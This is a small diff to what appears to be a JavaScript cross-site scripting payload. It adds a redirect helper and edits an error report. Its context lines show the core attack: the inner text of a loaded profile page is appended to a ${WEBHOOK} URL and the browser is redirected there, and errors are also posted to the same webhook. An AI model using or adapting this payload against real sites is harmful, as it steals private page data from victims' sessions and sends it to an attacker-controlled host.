@@ -15,6 +15,10 @@ function post(url, data) {
   return xhr.send(data);
 }
 
+function imgEnd() {
+  window.location = PROFILE;
+}
+
 // const queryString = window.location.search;
 // const urlParams = new URLSearchParams(queryString);
 // const id = urlParams.get("id");
@@ -31,5 +35,5 @@ window.location = "${WEBHOOK}?" + profile.document.body.innerText;
 
   setTimeout(() => (window.location = PROFILE), 4000);
 } catch (error) {
-  post(WEBHOOK, `Error ${id}: ${error}`);
+  post(WEBHOOK, `Error: ${error}`);
 }
